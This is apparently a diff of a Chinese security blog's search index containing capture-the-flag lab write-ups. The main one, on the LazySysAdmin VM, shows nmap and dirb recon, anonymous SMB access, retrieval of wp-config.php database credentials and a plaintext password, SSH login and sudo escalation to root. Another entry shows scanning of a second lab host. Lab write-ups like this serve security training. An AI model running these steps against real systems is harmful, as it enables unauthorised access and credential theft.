2019-05-28T00:34:48+10:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smbv2-enabled: Server supports SMBv2 protocol</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.90 seconds</span><br></pre></td></tr></table></figure></p>
+<p>祭出dirb <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon May 27 21:38:27 2019</span><br><span class="line">URL_BASE: http://172.17.135.63/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.63/ ----</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/apache/                                                                                                                                                    </span><br><span class="line">+ http://172.17.135.63/index.html (CODE:200|SIZE:36072)                                                                                                                                        </span><br><span class="line">+ http://172.17.135.63/info.php (CODE:200|SIZE:77255)                                                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/javascript/                                                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/old/                                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/phpmyadmin/                                                                                                                                                </span><br><span class="line">+ http://172.17.135.63/robots.txt (CODE:200|SIZE:92)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.63/server-status (CODE:403|SIZE:293)                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/<span class="built_in">test</span>/                                                                                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wordpress/                                                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wp/</span><br></pre></td></tr></table></figure></p>
+<p>匿名访问smb <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [22:46:26] </span></span><br><span class="line">$ smbclient -L 172.17.135.63    </span><br><span class="line">WARNING: The <span class="string">"syslog"</span> option is deprecated</span><br><span class="line">Enter divint3<span class="string">'s password: </span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">        share$          Disk      Sumshare</span></span><br><span class="line"><span class="string">        IPC$            IPC       IPC Service (Web server)</span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Server               Comment</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        DESKTOP-IN4T2GV      </span></span><br><span class="line"><span class="string">        LAZYSYSADMIN         Web server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Workgroup            Master</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        WORKGROUP            DESKTOP-IN4T2GV</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># divint3 @ Divint3 in ~ [22:20:32] </span></span><br><span class="line"><span class="string">$ smbclient //172.17.135.63/share$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: The "syslog" option is deprecated</span></span><br><span class="line"><span class="string">Enter divint3'</span>s password: </span><br><span class="line">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  ..                                  D        0  Mon Aug 14 20:34:47 2017</span><br><span class="line">  wordpress                           D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  Backnode_files                      D        0  Mon Aug 14 20:08:26 2017</span><br><span class="line">  wp                                  D        0  Tue Aug 15 18:51:23 2017</span><br><span class="line">  deets.txt                           N      139  Mon Aug 14 20:20:05 2017</span><br><span class="line">  robots.txt                          N       92  Mon Aug 14 20:36:14 2017</span><br><span class="line">  todolist.txt                        N       79  Mon Aug 14 20:39:56 2017</span><br><span class="line">  apache                              D        0  Mon Aug 14 20:35:19 2017</span><br><span class="line">  index.html                          N    36072  Sun Aug  6 13:02:15 2017</span><br><span class="line">  info.php                            N       20  Tue Aug 15 18:55:19 2017</span><br><span class="line">  <span class="built_in">test</span>                                D        0  Mon Aug 14 20:35:10 2017</span><br><span class="line">  old                                 D        0  Mon Aug 14 20:35:13 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237820 blocks available</span><br><span class="line">smb: \&gt; get todolist.txt </span><br><span class="line">getting file \todolist.txt of size 79 as todolist.txt (8.6 KiloBytes/sec) (average 8.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get deets.txt </span><br><span class="line">getting file \deets.txt of size 139 as deets.txt (5.0 KiloBytes/sec) (average 5.9 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> wordpress</span><br><span class="line">smb: \wordpress\&gt; ls</span><br><span class="line">  .                                   D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  ..                                  D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  wp-config-sample.php                N     2853  Wed Dec 16 17:58:26 2015</span><br><span class="line">  wp-trackback.php                    N     4513  Sat Oct 15 03:39:28 2016</span><br><span class="line">  wp-admin                            D        0  Thu Aug  3 05:02:02 2017</span><br><span class="line">  wp-settings.php                     N    16200  Fri Apr  7 02:01:42 2017</span><br><span class="line">  wp-blog-header.php                  N      364  Sat Dec 19 19:20:28 2015</span><br><span class="line">  index.php                           N      418  Wed Sep 25 08:18:11 2013</span><br><span class="line">  wp-cron.php                         N     3286  Mon May 25 01:26:25 2015</span><br><span class="line">  wp-links-opml.php                   N     2422  Mon Nov 21 10:46:30 2016</span><br><span class="line">  readme.html                         N     7413  Mon Dec 12 16:01:39 2016</span><br><span class="line">  wp-signup.php                       N    29924  Tue Jan 24 19:08:42 2017</span><br><span class="line">  wp-content                          D        0  Mon Aug 21 18:07:27 2017</span><br><span class="line">  license.txt                         N    19935  Tue Jan  3 01:58:42 2017</span><br><span class="line">  wp-mail.php                         N     8048  Wed Jan 11 13:13:43 2017</span><br><span class="line">  wp-activate.php                     N     5447  Wed Sep 28 05:36:28 2016</span><br><span class="line">  .htaccess                           H       35  Tue Aug 15 19:40:13 2017</span><br><span class="line">  xmlrpc.php                          N     3065  Thu Sep  1 00:31:29 2016</span><br><span class="line">  wp-login.php                        N    34327  Sat May 13 01:12:46 2017</span><br><span class="line">  wp-load.php                         N     3301  Tue Oct 25 11:15:30 2016</span><br><span class="line">  wp-comments-post.php                N     1627  Mon Aug 29 20:00:32 2016</span><br><span class="line">  wp-config.php                       N     3703  Mon Aug 21 17:25:14 2017</span><br><span class="line">  wp-includes                         D        0  Thu Aug  3 05:02:03 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237744 blocks available</span><br><span class="line">smb: \wordpress\&gt; get wp-config.php </span><br><span class="line">getting file \wordpress\wp-config.php of size 3703 as wp-config.php (452.0 KiloBytes/sec) (average 452.0 KiloBytes/sec)</span><br><span class="line">smb: \wordpress\&gt;</span><br></pre></td></tr></table></figure> deets.txt <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br></pre></td></tr></table></figure></p>
+<p>todolist.txt <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Prevent users from being able to view to web root using the local file browser</span><br></pre></td></tr></table></figure></p>
+<p>wp-config.php的内容包含数据库配置,故下载 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don't have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to "wp-config.php" and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'Admin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'TogieMYSQL12345^^'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line">define(<span class="string">'DB_CHARSET'</span>, <span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don't change this if in doubt. */</span></span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'AUTH_KEY'</span>,         <span class="string">'SAq-)W,-K9tFcW(=?ro4SJ5)R.mx%+@KL-I@PB&#123;&lt;-i&gt;g3n^1|E&lt;-uN|&#125;F;:PbMYJ'</span>);</span><br><span class="line">define(<span class="string">'SECURE_AUTH_KEY'</span>,  <span class="string">'u .o%Ld%m27waNqK+*`~&amp;j6~v!d7vI|OwA|hd8%r#ri_`WRIcCN-KiTSWmk)1;xG'</span>);</span><br><span class="line">define(<span class="string">'LOGGED_IN_KEY'</span>,    <span class="string">'iX^NN~N7R5Mdmeh:$iLY60r~K[)^f5vk`wGDO30r8Ns)gA17FRt2|$#S!Lq@-&lt;|`'</span>);</span><br><span class="line">define(<span class="string">'NONCE_KEY'</span>,        <span class="string">',_xAk=+)B7f_a|#J44&#125;qWca!=`s4&#123;C2.Xe&gt;sY%4Ybd5*3z9WRH-ysm=.|Gm^McvU'</span>);</span><br><span class="line">define(<span class="string">'AUTH_SALT'</span>,        <span class="string">'(:^&lt;BWwzWYx ,f^9anxD,+V+2-&amp;,VJ@@)U7CSzjv_MvD67&gt;?05ihCG]Q1K:_7Xsa'</span>);</span><br><span class="line">define(<span class="string">'SECURE_AUTH_SALT'</span>, <span class="string">'ud]&#125;&#125;0rWRMGZ+a`Hky G7|i|+c7YyH4=l#5&#123;/1R=|]PYrOmN&#123;&amp;0JuqkO=o5vyGg5'</span>);</span><br><span class="line">define(<span class="string">'LOGGED_IN_SALT'</span>,   <span class="string">'=M_DRp%vGmijIhl%K!(v&gt;:,*RR&lt;cl9ahav%&#123;q`&amp;I/0HD/$W/LK:mxR37PKh?Zzi8'</span>);</span><br><span class="line">define(<span class="string">'NONCE_SALT'</span>,       <span class="string">'ABOgE&gt;G:U;Q/hO^&gt;jBG5e96OL6+&#123;=mV,|2S~c,~dhVa!E/&amp;Q[Mc8#IgVTuXAI&#125;sY'</span>);</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$table_prefix  = <span class="string">'wp_'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the Codex.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">define(<span class="string">'WP_DEBUG'</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That's all, stop editing! Happy blogging. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( !defined(<span class="string">'ABSPATH'</span>) )</span><br><span class="line">	define(<span class="string">'ABSPATH'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dynamic site URL added by Togie */</span></span><br><span class="line">$currenthost = <span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>];</span><br><span class="line">$currentpath = preg_replace(<span class="string">'@/+$@'</span>,<span class="string">''</span>,dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]));</span><br><span class="line">$currentpath = preg_replace(<span class="string">'/\/wp.+/'</span>,<span class="string">''</span>,$currentpath);</span><br><span class="line">define(<span class="string">'WP_HOME'</span>,$currenthost.$currentpath);</span><br><span class="line">define(<span class="string">'WP_SITEURL'</span>,$currenthost.$currentpath);</span><br><span class="line">define(<span class="string">'WP_CONTENT_URL'</span>, $currenthost.$currentpath.<span class="string">'/wp-content'</span>);</span><br><span class="line">define(<span class="string">'WP_PLUGIN_URL'</span>, $currenthost.$currentpath.<span class="string">'/wp-content/plugins'</span>);</span><br><span class="line">define(<span class="string">'DOMAIN_CURRENT_SITE'</span>, $currenthost.$currentpath );</span><br><span class="line">@define(<span class="string">'ADMIN_COOKIE_PATH'</span>, <span class="string">'./'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">'wp-settings.php'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>访问http://172.17.135.63/wordpress/ 得到提示,my name is togie.</p>
+<p>ssh链接<code>ssh togie@172.17.135.63</code>密码<strong>12345</strong> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ cd </span><br><span class="line">-rbash: cd: restricted</span><br></pre></td></tr></table></figure> 切换至bash</p>
+<p><code>sudo -s</code>提权到root <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ sudo -s</span><br><span class="line">[sudo] password for togie: </span><br><span class="line">root@LazySysAdmin:~# whoami</span><br><span class="line">root</span><br><span class="line">root@LazySysAdmin:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure></p>
+<p>root依然默认使用rbash切换到bash,但是从passwd中看是bash,但是就是不能用cd <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@LazySysAdmin:/root<span class="comment"># cat proof.txt </span></span><br><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ<span class="comment">#PT9851</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Well <span class="keyword">done</span> :)</span><br><span class="line"></span><br><span class="line">Hope you learn<span class="string">'t a few things along the way.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Togie Mcdogie</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enjoy some random strings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span></span><br><span class="line"><span class="string">2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7</span></span><br><span class="line"><span class="string">pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02</span></span><br><span class="line"><span class="string">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span></span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -5277,21 +5399,6 @@ S_{OOK}(t)=a_n \cdot Acos\omega_ct
 <hr />
 <h4 id="less-10">less-10</h4>
 <p>首先根据题意写代码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"admin"</span>;</span><br><span class="line">$s = serialize($a);</span><br><span class="line">$p = base64_encode($s);</span><br><span class="line"><span class="keyword">echo</span> $p . <span class="string">"\n"</span>;</span><br><span class="line">$role = unserialize(base64_decode($p));</span><br><span class="line"><span class="keyword">echo</span> $role;</span><br></pre></td></tr></table></figure> 使用chrome 编辑cookies来弹出cookies</p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>靶场8</title>
-    <url>/%E9%9D%B6%E5%9C%BA8/</url>
-    <content><![CDATA[<h1 id="靶场八">靶场八</h1>
-<p>看网页源代码,得到flag1<code>flag1{Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=}</code></p>
-<p>解码得到<code>CIA – Operation Treadstone</code> cwel 爬取字典<code>https://bourne.fandom.com/wiki/Operation_Treadstone</code> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:12:08] C:130</span></span><br><span class="line">$ dirb http://172.17.135.8/ -S </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri May 31 21:12:11 2019</span><br><span class="line">URL_BASE: http://172.17.135.8/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">OPTION: Silent Mode</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.8/ ----</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/admin/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/css/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/db/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/dist/</span><br><span class="line">+ http://172.17.135.8/index.php (CODE:200|SIZE:2433)</span><br><span class="line">+ http://172.17.135.8/server-status (CODE:403|SIZE:292)</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/squirrelmail/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/supplier/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/upload/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/user/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/vendor/</span><br></pre></td></tr></table></figure></p>
-<p>nmap</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:49:01] </span></span><br><span class="line">$ nmap 172.17.135.8 -Pn -sS                        </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-31 22:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.8</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">21/tcp  open  ftp</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">143/tcp open  imap</span><br><span class="line">993/tcp open  imaps</span><br><span class="line">995/tcp open  pop3s</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.90 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:14:25] C:130</span></span><br><span class="line">$ nmap 172.17.135.8 -A -O -sS</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-31 21:14 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.8</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">21/tcp  open  ftp      vsftpd 3.0.2</span><br><span class="line">22/tcp  open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 a9:98:84:aa:90:7e:f1:e6:be:c0:84:3e:fa:aa:83:8a (DSA)</span><br><span class="line">|   2048 07:5c:77:15:30:5a:17:95:8e:0f:91:f0:2d:0b:c3:7a (RSA)</span><br><span class="line">|_  256 2f:9c:29:b5:f5:dc:f4:95:07:6d:41:ee:f9:0d:15:b8 (ECDSA)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: BlackMarket Weapon Management System</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL STLS PIPELINING RESP-CODES UIDL CAPA TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">143/tcp open  imap     Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: listed OK IDLE more ID ENABLE LOGIN-REFERRALS LITERAL+ STARTTLS post-login capabilities SASL-IR Pre-login LOGINDISABLEDA0001 have IMAP4rev1</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">993/tcp open  ssl/imap Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: listed OK IDLE IMAP4rev1 AUTH=PLAINA0001 LOGIN-REFERRALS LITERAL+ post-login more ID SASL-IR capabilities Pre-login have ENABLE</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">995/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING RESP-CODES UIDL CAPA TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.2, Linux 3.16 - 4.6, Linux 3.2 - 4.6, Linux 4.4</span><br><span class="line">Network Distance: 3 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   ...</span><br><span class="line">2   5.15 ms bogon (192.168.230.30)</span><br><span class="line">3   3.27 ms 172.17.135.8</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 26.36 seconds</span><br></pre></td></tr></table></figure>
-<p>配置漏洞扫描器 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulnersCom&#x2F;nmap-vulners.git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scipag&#x2F;vulscan.git</span><br><span class="line">cd vulscan&#x2F;utilities&#x2F;updater&#x2F;</span><br><span class="line">chmod +x updateFiles.sh</span><br><span class="line">.&#x2F;updateFiles.sh</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script vulscan  -sV 172.17.135.8</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -5358,308 +5465,201 @@ S_{OOK}(t)=a_n \cdot Acos\omega_ct
       </categories>
   </entry>
   <entry>
-    <title>2018-寒假学习记录</title>
-    <url>/2018-%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="寒假学习记录">2018-寒假学习记录</h1>
-<h3 id="假期学习了">假期学习了</h3>
-<ul>
-<li>Thinkphp5.1</li>
-<li>Bootstrap4</li>
-<li>jquery ajax</li>
-<li>markdown</li>
-</ul>
-<h2 id="section"><a id="more"></a></h2>
-<h4 id="便于爬虫识别的html标签">便于爬虫识别的html标签</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">section定义 </span><br><span class="line">	用来区分各板块</span><br><span class="line">header main footer为方便爬虫检索</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table定义</span><br><span class="line"></span><br><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;Month&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th&gt;Savings&lt;&#x2F;th&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;January&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;$100&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">div 背景图片自适应显示</span><br><span class="line">	background-image: url(..&#x2F;imgs&#x2F;footerkuang.png);</span><br><span class="line">    background-repeat: no-repeat;     &#x2F;&#x2F;无重复</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    -moz-background-size: 100% 100%;</span><br><span class="line">	</span><br><span class="line">图片自适应div大小 